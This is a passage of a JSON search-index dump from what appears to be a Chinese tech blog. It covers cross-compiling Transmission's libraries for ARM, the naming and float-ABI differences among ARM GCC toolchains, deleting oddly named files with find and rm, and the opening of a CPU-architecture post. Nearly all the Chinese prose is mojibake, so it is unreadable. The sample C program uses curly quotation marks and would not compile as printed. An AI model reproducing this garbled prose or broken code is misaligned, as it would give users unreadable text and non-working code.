libevent-2.0.21-stable\n./configure --host=\"arm-none-linux-gnueabi\" --prefix=\"/root/ARM/opt/\"\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install\n```\n\n\n\n### 2.3 libcurl\n\n```shell\nwget https://curl.haxx.se/download/curl-7.61.1.tar.gz\ntar zxvf curl-7.61.1.tar.gz\ncd curl-7.61.1\n./configure --prefix=\"/root/ARM/opt/\" --target=arm-none-linux-gnueabi --host=arm-none-linux-gnueabi --with-zlib=\"/root/ARM/opt\" --with-ssl=\"/root/ARM/opt\"\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install\n```\n\n\n\né”™è¯¯1. configure: error: /root/ARM/opt is a bad --with-ssl prefix! -> å®‰è£…openssl\n\n\n\n### 2.4 openssl\n\n```shell\nwget https://www.openssl.org/source/openssl-1.1.1.tar.gz\ntar zxvf openssl-1.1.1.tar.gz\ncd openssl-1.1.1\n./Configure linux-generic32 shared  -DL_ENDIAN --prefix=/root/ARM/opt --openssldir=/root/ARM/opt\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\" MAKEDEPPROG=\"${cross}gcc\" PROCESSOR=ARM\nmake install\n```\n\n\n\n### 2.5 zlib\n\n```shell\nwget http://zlib.net/zlib-1.2.11.tar.gz\ntar zxvf zlib-1.2.11.tar.gz\ncd zlib-1.2.11\n./configure --prefix=\"/root/ARM/opt\"\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install\n```\n\n\n\n# 3. ç¼–è¯‘systemd\n\nå‚è€ƒ: https://wiki.beyondlogic.org/index.php?title=Cross_Compiling_SystemD_for_ARM\n\n#### 1. libkmod\n\n```shell\nwget https://www.kernel.org/pub/linux/utils/kernel/kmod/kmod-17.tar.gz\n./configure --host=arm-none-linux-gnueabi --prefix=/root/ARM/opt/ \n\nmake \nmake install \n```\n\n#### 2. libffi\n\n```shell\nwget https://sourceware.org/ftp/libffi/libffi-3.2.1.tar.gz\n./configure --prefix=/root/ARM/opt/  CC=arm-none-linux-gnueabi-gcc --host=arm-none-linux-gnueabi   \n\nmake\nmake install\n```\n\n#### 3. pcre\n\n```shell\nwget ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.42.tar.gz\n./configure --prefix=/root/ARM/opt/ --host=arm-none-linux-gnueabi   CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\"\n\nmake\nmake install\n```\n\n#### 4. libattr\n\n```shell\nwget https://download-mirror.savannah.gnu.org/releases/attr/attr-2.4.48.tar.gz\n./configure --host=arm-none-linux-gnueabi --prefix=/root/ARM/opt/\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\" \nmake install\n```\n\n#### 5. libcap\n\n```shell\nwget https://www.kernel.org/pub/linux/libs/security/linux-privs/libcap2/libcap-2.24.tar.xz \nmake prefix=/root/ARM/opt/  BUILD_CC=gcc  CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install\n```\n\nmakeä¸æˆåŠŸä¿®æ”¹æ–‡ä»¶:\n\n```shell\nvi libcap/cap_file.c\n\n-#ifdef VFS_CAP_U32\n+#if defined (VFS_CAP_U32) && defined (XATTR_NAME_CAPS)\n```\n\n#### 6. glibc(æ²¡æœ‰æˆåŠŸ....)\n\n```shell\nwget http://ftp.gnome.org/pub/gnome/sources/glib/2.52/glib-2.52.3.tar.xz\n\nexport glib_cv_stack_grows=no; \\\nexport glib_cv_uscore=no; \\\nexport ac_cv_func_posix_getpwuid_r=no; \\\nexport ac_cv_func_posix_getgrgid_r=no; \\\nCFLAGS=-I/root/ARM/opt/include \\\nLDFLAGS=-L/root/ARM/opt/lib \\\n\n \n./configure --host=arm-none-linux-gnueabi --prefix=/root/ARM/opt/ --disable-libmount\n```\n\n\n\n# 4. ç›®æ ‡å¹³å°è¿è¡Œ\n\n+ systemdç¼–è¯‘å¤±è´¥, å¯åœ¨ç¼–è¯‘transmissionçš„æ—¶å€™å»æ‰systemd\n\n+ ç›®æ ‡å¹³å°æ‰§è¡Œtransmissionçš„ç¯å¢ƒå˜é‡(å¯å¿½ç•¥)\n\n```shell\nexport PATH=/dev/opt/bin:$PATH\nexport LD_LIBRARY_PATH=/dev/opt/lib:$LD_LIBRARY_PATH\nexport CURL_CA_BUNDLE=/mnt/Sync2/ca.crt\nexport TR_CURL_SSL_CERT=/mnt/Sync2/cert.pem\nexport TR_CURL_SSL_CERT=/mnt/Sync2/cert.pem\nexport TR_CURL_SSL_KEY=/mnt/Sync2/key.pem\nexport STNOUPGRADE=1\n```\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://wiki.beyondlogic.org/index.php?title=Cross_Compiling_SystemD_for_ARM","tags":["transmission"],"categories":["BitTorrent"]},{"title":"armäº¤å‰ç¼–è¯‘å™¨çš„åŒºåˆ«","url":"%2Fp%2Fa63b0191.html","content":"\n\n\n## ä¸ºä»€ä¹ˆè¦ç”¨äº¤å‰ç¼–è¯‘å™¨ï¼Ÿ\n\näº¤å‰ç¼–è¯‘é€šä¿—åœ°è®²å°±æ˜¯åœ¨ä¸€ç§å¹³å°ä¸Šç¼–è¯‘å‡ºèƒ½è¿è¡Œåœ¨ä½“ç³»ç»“æ„ä¸åŒçš„å¦ä¸€ç§å¹³å°ä¸Šçš„ç¨‹åºï¼Œæ¯”å¦‚åœ¨PCå¹³å°ï¼ˆX86 CPUï¼‰ä¸Šç¼–è¯‘å‡ºèƒ½è¿è¡Œåœ¨ä»¥ARMä¸ºå†…æ ¸çš„CPUå¹³å°ä¸Šçš„ç¨‹åºï¼Œç¼–è¯‘å¾—åˆ°çš„ç¨‹åºåœ¨X86 CPUå¹³å°ä¸Šæ˜¯ä¸èƒ½è¿è¡Œçš„ï¼Œå¿…é¡»æ”¾åˆ°ARM CPUå¹³å°ä¸Šæ‰èƒ½è¿è¡Œï¼Œè™½ç„¶ä¸¤ä¸ªå¹³å°ç”¨çš„éƒ½æ˜¯Linuxç³»ç»Ÿã€‚\n\näº¤å‰ç¼–è¯‘å·¥å…·é“¾æ˜¯ä¸€ä¸ªç”±ç¼–è¯‘å™¨ã€è¿æ¥å™¨å’Œè§£é‡Šå™¨ç»„æˆçš„ç»¼åˆå¼€å‘ç¯å¢ƒï¼Œäº¤å‰ç¼–è¯‘å·¥å…·é“¾ä¸»è¦ç”±binutilsã€gccå’Œglibcä¸‰ä¸ªéƒ¨åˆ†ç»„æˆã€‚æœ‰æ—¶å‡ºäºå‡å° libc åº“å¤§å°çš„è€ƒè™‘ï¼Œä¹Ÿå¯ä»¥ç”¨åˆ«çš„ c åº“æ¥ä»£æ›¿ glibcï¼Œä¾‹å¦‚ uClibcã€dietlibc å’Œ newlibã€‚\n\nå»ºç«‹äº¤å‰ç¼–è¯‘å·¥å…·é“¾æ˜¯ä¸€ä¸ªç›¸å½“å¤æ‚çš„è¿‡ç¨‹ï¼Œå¦‚æœä¸æƒ³è‡ªå·±ç»å†å¤æ‚ç¹ççš„ç¼–è¯‘è¿‡ç¨‹ï¼Œç½‘ä¸Šæœ‰ä¸€äº›ç¼–è¯‘å¥½çš„å¯ç”¨çš„äº¤å‰ç¼–è¯‘å·¥å…·é“¾å¯ä»¥ä¸‹è½½ï¼Œä½†å°±ä»¥å­¦ä¹ ä¸ºç›®çš„æ¥è¯´è¯»è€…æœ‰å¿…è¦å­¦ä¹ è‡ªå·±åˆ¶ä½œä¸€ä¸ªäº¤å‰ç¼–è¯‘å·¥å…·é“¾ï¼ˆç›®å‰æ¥çœ‹ï¼Œå¯¹äºåˆå­¦è€…æ²¡æœ‰å¤ªå¤§å¿…è¦è‡ªå·±äº¤å‰ç¼–è¯‘ä¸€ä¸ªå·¥å…·é“¾ï¼‰ã€‚\n\n<!-- more -->\n\n## åˆ†ç±»å’Œè¯´æ˜\n\nä»æˆæƒä¸Šï¼Œåˆ†ä¸ºå…è´¹æˆæƒç‰ˆå’Œä»˜è´¹æˆæƒç‰ˆã€‚\n\nå…è´¹ç‰ˆç›®å‰æœ‰ä¸‰å¤§ä¸»æµå·¥å…·å•†æä¾›ï¼Œç¬¬ä¸€æ˜¯GNUï¼ˆæä¾›æºç ï¼Œè‡ªè¡Œç¼–è¯‘åˆ¶ä½œï¼‰ï¼Œç¬¬äºŒæ˜¯ Codesourceryï¼Œç¬¬ä¸‰æ˜¯Linoraã€‚\n\næ”¶è´¹ç‰ˆæœ‰ARMåŸå‚æä¾›çš„armccã€IARæä¾›çš„ç¼–è¯‘å™¨ç­‰ç­‰ï¼Œå› ä¸ºè¿™äº›ä»·æ ¼éƒ½æ¯”è¾ƒæ˜‚è´µï¼Œä¸é€‚åˆå­¦ä¹ ç”¨æˆ·ä½¿ç”¨ï¼Œæ‰€ä»¥ä¸åšè®²è¿°ã€‚\n\n\n\n+ arm-none-linux-gnueabi-gccï¼šæ˜¯ Codesourcery å…¬å¸ï¼ˆç›®å‰å·²ç»è¢«Mentoræ”¶è´­ï¼‰åŸºäºGCCæ¨å‡ºçš„çš„ARMäº¤å‰ç¼–è¯‘å·¥å…·ã€‚å¯ç”¨äºäº¤å‰ç¼–è¯‘ARMï¼ˆ32ä½ï¼‰ç³»ç»Ÿä¸­æ‰€æœ‰ç¯èŠ‚çš„ä»£ç ï¼ŒåŒ…æ‹¬è£¸æœºç¨‹åºã€u-bootã€Linux  kernelã€filesystemå’ŒAppåº”ç”¨ç¨‹åºã€‚\n\n+ arm-linux-gnueabihf-gccï¼šæ˜¯ç”± Linaro å…¬å¸åŸºäºGCCæ¨å‡ºçš„çš„ARMäº¤å‰ç¼–è¯‘å·¥å…·ã€‚å¯ç”¨äºäº¤å‰ç¼–è¯‘ARMï¼ˆ32ä½ï¼‰ç³»ç»Ÿä¸­æ‰€æœ‰ç¯èŠ‚çš„ä»£ç ï¼ŒåŒ…æ‹¬è£¸æœºç¨‹åºã€u-bootã€Linux kernelã€filesystemå’ŒAppåº”ç”¨ç¨‹åºã€‚\n\n+ aarch64-linux-gnu-gccï¼šæ˜¯ç”± Linaro å…¬å¸åŸºäºGCCæ¨å‡ºçš„çš„ARMäº¤å‰ç¼–è¯‘å·¥å…·ã€‚å¯ç”¨äºäº¤å‰ç¼–è¯‘ARMv8 64ä½ç›®æ ‡ä¸­çš„è£¸æœºç¨‹åºã€u-bootã€Linux  kernelã€filesystemå’ŒAppåº”ç”¨ç¨‹åºã€‚\n\n+ arm-none-elf-gccï¼šæ˜¯ Codesourcery å…¬å¸ï¼ˆç›®å‰å·²ç»è¢«Mentoræ”¶è´­ï¼‰åŸºäºGCCæ¨å‡ºçš„çš„ARMäº¤å‰ç¼–è¯‘å·¥å…·ã€‚å¯ç”¨äºäº¤å‰ç¼–è¯‘ARM MCUï¼ˆ32ä½ï¼‰èŠ¯ç‰‡ï¼Œå¦‚ARM7ã€ARM9ã€Cortex-M/RèŠ¯ç‰‡ç¨‹åºã€‚\n\n+ arm-none-eabi-gccï¼šæ˜¯ GNU æ¨å‡ºçš„çš„ARMäº¤å‰ç¼–è¯‘å·¥å…·ã€‚å¯ç”¨äºäº¤å‰ç¼–è¯‘ARM MCUï¼ˆ32ä½ï¼‰èŠ¯ç‰‡ï¼Œå¦‚ARM7ã€ARM9ã€Cortex-M/RèŠ¯ç‰‡ç¨‹åºã€‚\n\n\n\n## äº¤å‰ç¼–è¯‘å™¨ä¸‹è½½\n\n- arm-none-linux-gnueabi-gccä¸‹è½½ï¼š<http://www.veryarm.com/arm-none-linux-gnueabi-gcc>\n- arm-linux-gnueabihf-gccä¸‹è½½ï¼š<http://www.veryarm.com/arm-linux-gnueabihf-gcc>\n- aarch64-linux-gnu-gccä¸‹è½½ï¼š<http://www.veryarm.com/aarch64-linux-gnu-gcc>\n- arm-none-elf-gccä¸‹è½½ï¼š<http://www.veryarm.com/arm-none-elf-gcc>\n- arm-none-eabi-gccä¸‹è½½ï¼š<http://www.veryarm.com/arm-none-eabi-gcc>\n\n ä»¥ä¸Šåœ°å€éƒ½æ˜¯ç›´æ¥ä»å®˜ç½‘è½¬å­˜åˆ°ç™¾åº¦äº‘ç›˜ï¼Œä»…ä¸ºæ–¹ä¾¿å›½å†…ç”¨æˆ·ä¸‹è½½ä½¿ç”¨ï¼Œå¹¶éæœ¬ç«™åˆ¶ä½œï¼Œè¯·å‹¿ç”¨äºå•†ä¸šæˆ–è€…éæ³•ç”¨é€”ã€‚å› ä¸ºç‰ˆæœ¬å¤šéš¾ä»¥é€‰æ‹©ï¼Œæ‰€ä»¥æˆ‘ä»¬å»ºè®®æ‚¨ä½¿ç”¨è¯¥ç±»ç¼–è¯‘å™¨çš„æœ€æ–°ç‰ˆæœ¬ã€‚\n\n\n\n## å‘½åè§„åˆ™\n\näº¤å‰ç¼–è¯‘å·¥å…·é“¾çš„å‘½åè§„åˆ™ä¸ºï¼š`arch [-vendor][-os] [-(gnu)eabi]`\n\n- **arch** - ä½“ç³»æ¶æ„ï¼Œå¦‚ARMï¼ŒMIPS\n- **vendor** - å·¥å…·é“¾æä¾›å•†\n- **os** - ç›®æ ‡æ“ä½œç³»ç»Ÿ\n- **eabi** - åµŒå…¥å¼åº”ç”¨äºŒè¿›åˆ¶æ¥å£ï¼ˆEmbedded Application Binary Interfaceï¼‰\n\næ ¹æ®å¯¹æ“ä½œç³»ç»Ÿçš„æ”¯æŒä¸å¦ï¼ŒARM GCCå¯åˆ†ä¸ºæ”¯æŒå’Œä¸æ”¯æŒæ“ä½œç³»ç»Ÿï¼Œå¦‚\n\n- **arm-none-eabi**ï¼šè¿™ä¸ªæ˜¯æ²¡æœ‰æ“ä½œç³»ç»Ÿçš„ï¼Œè‡ªç„¶ä¸å¯èƒ½æ”¯æŒé‚£äº›è·Ÿæ“ä½œç³»ç»Ÿå…³ç³»å¯†åˆ‡çš„å‡½æ•°ï¼Œæ¯”å¦‚fork(2)ã€‚ä»–ä½¿ç”¨çš„æ˜¯newlibè¿™ä¸ªä¸“ç”¨äºåµŒå…¥å¼ç³»ç»Ÿçš„Cåº“ã€‚\n- **arm-none-linux-eabi**ï¼šç”¨äºLinuxçš„ï¼Œä½¿ç”¨Glibc\n\n\n\n##  å®ä¾‹\n\n#### 1ã€arm-none-eabi-gcc\n\nï¼ˆARM architectureï¼Œno vendorï¼Œnot target an operating systemï¼Œcomplies with the ARM EABIï¼‰\nç”¨äºç¼–è¯‘ ARM æ¶æ„çš„è£¸æœºç³»ç»Ÿï¼ˆåŒ…æ‹¬ ARM Linux çš„ bootã€kernelï¼Œä¸é€‚ç”¨ç¼–è¯‘ Linux åº”ç”¨ Applicationï¼‰ï¼Œä¸€èˆ¬é€‚åˆ ARM7ã€Cortex-M å’Œ Cortex-R å†…æ ¸çš„èŠ¯ç‰‡ä½¿ç”¨ï¼Œæ‰€ä»¥ä¸æ”¯æŒé‚£äº›è·Ÿæ“ä½œç³»ç»Ÿå…³ç³»å¯†åˆ‡çš„å‡½æ•°ï¼Œæ¯”å¦‚fork(2)ï¼Œä»–ä½¿ç”¨çš„æ˜¯ newlib è¿™ä¸ªä¸“ç”¨äºåµŒå…¥å¼ç³»ç»Ÿçš„Cåº“ã€‚\n\n#### 2ã€arm-none-linux-gnueabi-gcc  //å¸¸ç”¨çš„\n\n(ARM architecture, no vendor, creates binaries that run on the **Linux** operating system, and uses the GNU EABI)\n\nä¸»è¦ç”¨äºåŸºäºARMæ¶æ„çš„Linuxç³»ç»Ÿï¼Œå¯ç”¨äºç¼–è¯‘ ARM æ¶æ„çš„ u-bootã€Linuxå†…æ ¸ã€linuxåº”ç”¨ç­‰ã€‚arm-none-linux-gnueabiåŸºäºGCCï¼Œä½¿ç”¨Glibcåº“ï¼Œç»è¿‡ `Codesourcery` å…¬å¸ä¼˜åŒ–è¿‡æ¨å‡ºçš„ç¼–è¯‘å™¨ã€‚arm-none-linux-gnueabi-xxx äº¤å‰ç¼–è¯‘å·¥å…·çš„æµ®ç‚¹è¿ç®—éå¸¸ä¼˜ç§€ã€‚ä¸€èˆ¬ARM9ã€ARM11ã€Cortex-A å†…æ ¸ï¼Œå¸¦æœ‰ Linux æ“ä½œç³»ç»Ÿçš„ä¼šç”¨åˆ°ã€‚\n\n#### 3ã€arm-eabi-gcc\n\nAndroid ARM ç¼–è¯‘å™¨ã€‚\n\n#### 4ã€armcc\n\nARM å…¬å¸æ¨å‡ºçš„ç¼–è¯‘å·¥å…·ï¼ŒåŠŸèƒ½å’Œ arm-none-eabi ç±»ä¼¼ï¼Œå¯ä»¥ç¼–è¯‘è£¸æœºç¨‹åºï¼ˆu-bootã€kernelï¼‰ï¼Œä½†æ˜¯ä¸èƒ½ç¼–è¯‘ Linux åº”ç”¨ç¨‹åºã€‚armccä¸€èˆ¬å’ŒARMå¼€å‘å·¥å…·ä¸€èµ·ï¼ŒKeil MDKã€ADSã€RVDSå’ŒDS-5ä¸­çš„ç¼–è¯‘å™¨éƒ½æ˜¯armccï¼Œæ‰€ä»¥ armcc ç¼–è¯‘å™¨éƒ½æ˜¯æ”¶è´¹çš„ï¼ˆçˆ±å›½ç‰ˆé™¤å¤–ï¼Œå‘µå‘µ~~ï¼‰ã€‚\n\n#### 5ã€arm-none-uclinuxeabi-gcc å’Œ arm-none-symbianelf-gcc\n\narm-none-uclinuxeabi ç”¨äº**uCLinux**ï¼Œä½¿ç”¨Glibcã€‚\n\narm-none-symbianelf ç”¨äº**symbian**ï¼Œæ²¡ç”¨è¿‡ï¼Œä¸çŸ¥é“Cåº“æ˜¯ä»€ä¹ˆ ã€‚\n\n\n\n## ABI å’Œ EABI\n\n**ABI**ï¼šäºŒè¿›åˆ¶åº”ç”¨ç¨‹åºæ¥å£(Application Binary Interface (ABI) for the ARM Architecture)ã€‚åœ¨è®¡ç®—æœºä¸­ï¼Œåº”ç”¨äºŒè¿›åˆ¶æ¥å£æè¿°äº†åº”ç”¨ç¨‹åºï¼ˆæˆ–è€…å…¶ä»–ç±»å‹ï¼‰å’Œæ“ä½œç³»ç»Ÿä¹‹é—´æˆ–å…¶ä»–åº”ç”¨ç¨‹åºçš„ä½çº§æ¥å£ã€‚\n\n**EABI**ï¼šåµŒå…¥å¼ABIã€‚åµŒå…¥å¼åº”ç”¨äºŒè¿›åˆ¶æ¥å£æŒ‡å®šäº†æ–‡ä»¶æ ¼å¼ã€æ•°æ®ç±»å‹ã€å¯„å­˜å™¨ä½¿ç”¨ã€å †ç§¯ç»„ç»‡ä¼˜åŒ–å’Œåœ¨ä¸€ä¸ªåµŒå…¥å¼è½¯ä»¶ä¸­çš„å‚æ•°çš„æ ‡å‡†çº¦å®šã€‚å¼€å‘è€…ä½¿ç”¨è‡ªå·±çš„æ±‡ç¼–è¯­è¨€ä¹Ÿå¯ä»¥ä½¿ç”¨ EABI ä½œä¸ºä¸å…¼å®¹çš„ç¼–è¯‘å™¨ç”Ÿæˆçš„æ±‡ç¼–è¯­è¨€çš„æ¥å£ã€‚\n\nä¸¤è€…ä¸»è¦åŒºåˆ«æ˜¯ï¼ŒABIæ˜¯è®¡ç®—æœºä¸Šçš„ï¼ŒEABIæ˜¯åµŒå…¥å¼å¹³å°ä¸Šï¼ˆå¦‚ARMï¼ŒMIPSç­‰ï¼‰ã€‚\n\n\n\n## Codesourceryå…¬å¸\n\nCodesourceryæ¨å‡ºçš„äº§å“å«Sourcery G++ Lite Editionï¼Œå…¶ä¸­åŸºäºcommand-lineçš„ç¼–è¯‘å™¨æ˜¯å…è´¹çš„ï¼Œåœ¨å®˜ç½‘ä¸Šå¯ä»¥ä¸‹è½½ï¼Œè€Œå…¶ä¸­åŒ…å«çš„IDEå’Œdebug å·¥å…·æ˜¯æ”¶è´¹çš„ï¼Œå½“ç„¶ä¹Ÿæœ‰30å¤©è¯•ç”¨ç‰ˆæœ¬çš„ã€‚\n\nç›®å‰CodeSourceryå·²ç»ç”±æ˜å¯¼å›½é™…(Mentor Graphics)æ”¶è´­ï¼Œæ‰€ä»¥åŸæœ¬çš„ç½‘ç«™é£æ ¼å·²ç»å…¨éƒ¨å˜ä¸º Mentor æ ·å¼ï¼Œä½†æ˜¯ Sourcery G++ Lite Edition åŒæ ·å¯ä»¥æ³¨å†Œåå…è´¹ä¸‹è½½ã€‚\n\nCodesourceryä¸€ç›´æ˜¯åœ¨åšARMç›®æ ‡ GCC çš„å¼€å‘å’Œä¼˜åŒ–ï¼Œå®ƒçš„ARM GCCåœ¨ç›®å‰åœ¨å¸‚åœºä¸Šéå¸¸ä¼˜ç§€ï¼Œå¾ˆå¤š patch å¯èƒ½è¿˜æ²¡è¢«gccæ¥å—ï¼Œæ‰€ä»¥è¿˜æ˜¯åº”è¯¥ç›´æ¥ç”¨å®ƒçš„ã€‚\n\nè€Œä¸”ä»–æä¾›Windowsä¸‹[mingwäº¤å‰ç¼–è¯‘çš„]å’ŒLinuxä¸‹çš„äºŒè¿›åˆ¶ç‰ˆæœ¬ï¼Œæ¯”è¾ƒæ–¹ä¾¿ï¼›å¦‚æœä¸æ˜¯å¾ˆæœ‰æ—¶é—´å’Œå…´è¶£ï¼Œä¸å»ºè®®ä¸‹è½½ src æºç åŒ…è‡ªå·±ç¼–è¯‘ï¼Œå¾ˆéº»çƒ¦ï¼ŒCodesourceryç»™çš„shellè„šæœ¬å¾ˆå¤šæ—¶å€™æ ¹æœ¬æ²¡åŠæ³•ç›´æ¥ç”¨ï¼Œå¾—è‡ªè¡Œæå–å…³é”®çš„éƒ¨åˆ†æ‰‹å·¥æ‰§è¡Œï¼Œåˆè´¹ç²¾åŠ›åˆè´¹æ—¶é—´ï¼Œå¦‚æœæƒ³çŸ¥é“ç»†èŠ‚ï¼Œå…¶å®ä¸ç”¨è‡ªå·±ç¼–è¯‘ä¸€éï¼Œçœ‹çœ‹ä»–æ˜¯ç”¨ä»€ä¹ˆæ­¥éª¤æ„å»ºçš„å³å¯ï¼Œå¦‚æœä½ å¯¹äº¤å‰ç¼–è¯‘å™¨æ„Ÿå…´è¶£çš„è¯ã€‚\n\n\n\n## arm-linux-gnueabi-gcc å’Œ arm-linux-gnueabihf-gcc\n\nä¸¤ä¸ªäº¤å‰ç¼–è¯‘å™¨åˆ†åˆ«é€‚ç”¨äº armel å’Œ armhf ä¸¤ä¸ªä¸åŒçš„æ¶æ„ï¼Œarmel å’Œ armhf è¿™ä¸¤ç§æ¶æ„åœ¨å¯¹å¾…æµ®ç‚¹è¿ç®—é‡‡å–äº†ä¸åŒçš„ç­–ç•¥ï¼ˆæœ‰ fpu çš„ arm æ‰èƒ½æ”¯æŒè¿™ä¸¤ç§æµ®ç‚¹è¿ç®—ç­–ç•¥ï¼‰ã€‚\n\nå…¶å®è¿™ä¸¤ä¸ªäº¤å‰ç¼–è¯‘å™¨åªä¸è¿‡æ˜¯ gcc çš„é€‰é¡¹ -mfloat-abi çš„é»˜è®¤å€¼ä¸åŒã€‚gcc çš„é€‰é¡¹ -mfloat-abi æœ‰ä¸‰ç§å€¼ **softã€softfpã€hard**ï¼ˆå…¶ä¸­åä¸¤è€…éƒ½è¦æ±‚ arm é‡Œæœ‰ fpu æµ®ç‚¹è¿ç®—å•å…ƒï¼Œsoft ä¸åä¸¤è€…æ˜¯å…¼å®¹çš„ï¼Œä½† softfp å’Œ hard ä¸¤ç§æ¨¡å¼äº’ä¸å…¼å®¹ï¼‰ï¼š\n**softï¼š** ä¸ç”¨fpuè¿›è¡Œæµ®ç‚¹è®¡ç®—ï¼Œå³ä½¿æœ‰fpuæµ®ç‚¹è¿ç®—å•å…ƒä¹Ÿä¸ç”¨ï¼Œè€Œæ˜¯ä½¿ç”¨è½¯ä»¶æ¨¡å¼ã€‚\n**softfpï¼š** armelæ¶æ„ï¼ˆå¯¹åº”çš„ç¼–è¯‘å™¨ä¸º arm-linux-gnueabi-gcc ï¼‰é‡‡ç”¨çš„é»˜è®¤å€¼ï¼Œç”¨fpuè®¡ç®—ï¼Œä½†æ˜¯ä¼ å‚æ•°ç”¨æ™®é€šå¯„å­˜å™¨ä¼ ï¼Œè¿™æ ·ä¸­æ–­çš„æ—¶å€™ï¼Œåªéœ€è¦ä¿å­˜æ™®é€šå¯„å­˜å™¨ï¼Œä¸­æ–­è´Ÿè·å°ï¼Œä½†æ˜¯å‚æ•°éœ€è¦è½¬æ¢æˆæµ®ç‚¹çš„å†è®¡ç®—ã€‚\n**hardï¼š** armhfæ¶æ„ï¼ˆå¯¹åº”çš„ç¼–è¯‘å™¨ arm-linux-gnueabihf-gcc ï¼‰é‡‡ç”¨çš„é»˜è®¤å€¼ï¼Œç”¨fpuè®¡ç®—ï¼Œä¼ å‚æ•°ä¹Ÿç”¨fpuä¸­çš„æµ®ç‚¹å¯„å­˜å™¨ä¼ ï¼Œçœå»äº†è½¬æ¢ï¼Œæ€§èƒ½æœ€å¥½ï¼Œä½†æ˜¯ä¸­æ–­è´Ÿè·é«˜ã€‚\n\n\n\næŠŠä»¥ä¸‹æµ‹è¯•ä½¿ç”¨çš„Cæ–‡ä»¶å†…å®¹ä¿å­˜æˆ mfloat.cï¼š\n\n```c\n#include <stdio.h>\nint main(void)\n{\n    double a,b,c;\n    a = 23.543;\n    b = 323.234;\n    c = b/a;\n    printf(â€œthe 13/2 = %f\\nâ€, c);\n    printf(â€œhello world !\\nâ€);\n    return 0;\n}\n```\n\n\n\n**1ã€ä½¿ç”¨ arm-linux-gnueabihf-gcc ç¼–è¯‘ï¼Œä½¿ç”¨â€œ-vâ€é€‰é¡¹ä»¥è·å–æ›´è¯¦ç»†çš„ä¿¡æ¯ï¼š**\n\\# arm-linux-gnueabihf-gcc -v mfloat.c\nCOLLECT_GCC_OPTIONS=â€™-vâ€™ â€˜-march=armv7-aâ€™ â€˜-mfloat-abi=hardâ€™ â€˜-mfpu=vfpv3-d16â€² â€˜-mthumbâ€™\n-mfloat-abi=hard\n\nå¯çœ‹å‡ºä½¿ç”¨hardç¡¬ä»¶æµ®ç‚¹æ¨¡å¼ã€‚\n\n**2ã€ä½¿ç”¨ arm-linux-gnueabi-gcc ç¼–è¯‘ï¼š**\n\\# arm-linux-gnueabi-gcc -v mfloat.c\nCOLLECT_GCC_OPTIONS=â€™-vâ€™ â€˜-march=armv7-aâ€™ â€˜-mfloat-abi=softfpâ€™ â€˜-mfpu=vfpv3-d16â€² â€˜-mthumbâ€™\n-mfloat-abi=softfp\n\nå¯çœ‹å‡ºä½¿ç”¨softfpæ¨¡å¼ã€‚","tags":["arm"],"categories":["ç³»ç»Ÿ"]},{"title":"ä½¿ç”¨ç®¡é“åˆ é™¤ä¸è§„åˆ™æ–‡ä»¶","url":"%2Fp%2Fa7ad4d37.html","content":"\n\n### 1. ä½¿ç”¨ xargs rm \n\n```\nls | grep abcd | rm  //é”™è¯¯ç”¨æ³•\n```\n\n\n\nrm doesn't accept input from `stdin`. You'll need to do something like\n\n```\nls | grep abcd | xargs rm\n```\n\nä½†æ˜¯é‡åˆ°ä¸è§„åˆ™ç¬¦å·çš„æ–‡ä»¶æœ‰å¯èƒ½åˆ é™¤ä¸äº†.\n\n\n\n### 2. ä½¿ç”¨ find exec\n\nå¯ä»¥åˆ é™¤ä¸è§„åˆ™ç¬¦å·æ–‡ä»¶:\n```\nfind . -name \"*td*\" -exec rm -f {} \\;\n```\n\n","tags":["linux"],"categories":["å‘½ä»¤"]},{"title":"æ·±å…¥äº†è§£CPUæ¶æ„","url":"%2Fp%2F690c18bd.html","content":"\n\n\n## CPUæ˜¯ä»€ä¹ˆ\n\nä¸­å¤®å¤„ç†å•å…ƒï¼ˆCPUï¼‰ä¸»è¦ç”±è¿ç®—å™¨ã€æ§åˆ¶å™¨ã€å¯„å­˜å™¨ä¸‰éƒ¨åˆ†ç»„æˆï¼Œä»å­—é¢æ„æ€çœ‹è¿ç®—å™¨å°±æ˜¯èµ·ç€è¿ç®—çš„ä½œç”¨ï¼Œæ§åˆ¶å™¨å°±æ˜¯è´Ÿè´£å‘å‡ºCPUæ¯æ¡æŒ‡ä»¤æ‰€éœ€è¦çš„ä¿¡æ¯ï¼Œå¯„å­˜å™¨å°±æ˜¯ä¿å­˜è¿ç®—æˆ–è€…æŒ‡ä»¤çš„ä¸€äº›ä¸´æ—¶æ–‡ä»¶ï¼Œè¿™æ ·å¯ä»¥ä¿è¯æ›´é«˜çš„é€Ÿåº¦ã€‚  \n\n\n\nCPUæœ‰ç€å¤„ç†æŒ‡ä»¤ã€æ‰§è¡Œæ“ä½œã€æ§åˆ¶æ—¶é—´ã€å¤„ç†æ•°æ®å››å¤§ä½œç”¨ï¼Œæ‰“ä¸ªæ¯”å–»æ¥è¯´ï¼ŒCPUå°±åƒæˆ‘ä»¬çš„å¤§è„‘ï¼Œå¸®æˆ‘ä»¬å®Œæˆå„ç§å„æ ·çš„ç”Ÿç†æ´»åŠ¨ã€‚å› æ­¤å¦‚æœæ²¡æœ‰CPUï¼Œé‚£ä¹ˆç”µè„‘å°±æ˜¯ä¸€å †åºŸç‰©ï¼Œæ— 